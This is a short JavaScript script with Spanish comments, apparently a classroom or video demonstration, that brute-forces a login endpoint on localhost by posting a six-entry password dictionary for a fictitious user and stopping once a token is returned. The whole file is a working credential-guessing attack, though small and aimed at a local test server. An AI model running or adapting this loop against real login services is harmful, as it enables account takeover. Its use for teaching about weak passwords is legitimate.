// scripts/brute-force.js
// Diccionario ficticio. La contraseña correcta de ana es "Sol-2024".
const objetivo = "ana@uni.edu.ec";
const diccionario = ["123456", "password", "qwerty", "ana2024", "Sol-2024", "otra"];
const url = "http://localhost:3000/login";

for (const [i, pwd] of diccionario.entries()) {
  const r = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: objetivo, password: pwd }),
  });
  const data = await r.json();
  const mascara = "*".repeat(pwd.length);
  console.log(`Intento ${i + 1} (${mascara}) → HTTP ${r.status}`, r.ok ? "✅ ACCESO" : "");
  if (r.ok) {
    console.log("Token obtenido: [oculto en el video]");
    break;
  }
}